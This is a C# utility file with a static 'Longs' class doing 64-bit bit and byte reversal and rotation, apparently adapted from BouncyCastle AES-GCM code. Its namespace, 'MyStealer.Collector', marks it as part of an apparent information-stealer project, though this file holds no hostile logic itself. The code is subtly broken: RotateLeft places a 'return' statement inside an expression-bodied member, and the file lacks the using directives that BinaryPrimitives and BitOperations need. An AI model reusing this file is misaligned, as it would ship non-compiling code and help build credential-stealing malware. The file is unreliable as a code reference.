using System;
namespace MyStealer.Collector.Utils.BcAesGcm
{
    public static class Longs
    {
        public const int NumBits = 64;
        public const int NumBytes = 8;

        public static long LowestOneBit(long i) => i & -i;

        [CLSCompliant(false)]
        public static ulong Reverse(ulong i)
        {
            i = Bits.BitPermuteStepSimple(i, 0x5555555555555555UL, 1);
            i = Bits.BitPermuteStepSimple(i, 0x3333333333333333UL, 2);
            i = Bits.BitPermuteStepSimple(i, 0x0F0F0F0F0F0F0F0FUL, 4);
            return ReverseBytes(i);
        }

        [CLSCompliant(false)]
        public static ulong ReverseBytes(ulong i)
        {
#if NETCOREAPP2_1_OR_GREATER || NETSTANDARD2_1_OR_GREATER
            return BinaryPrimitives.ReverseEndianness(i);
#else
            return RotateLeft(i & 0xFF000000FF000000UL, 8) |
                   RotateLeft(i & 0x00FF000000FF0000UL, 24) |
                   RotateLeft(i & 0x0000FF000000FF00UL, 40) |
                   RotateLeft(i & 0x000000FF000000FFUL, 56);
#endif
        }

        [CLSCompliant(false)]
        public static ulong RotateLeft(ulong i, int distance) =>
#if NETCOREAPP3_0_OR_GREATER
            return BitOperations.RotateLeft(i, distance);
#else
            i << distance | i >> -distance;
#endif

    }
}
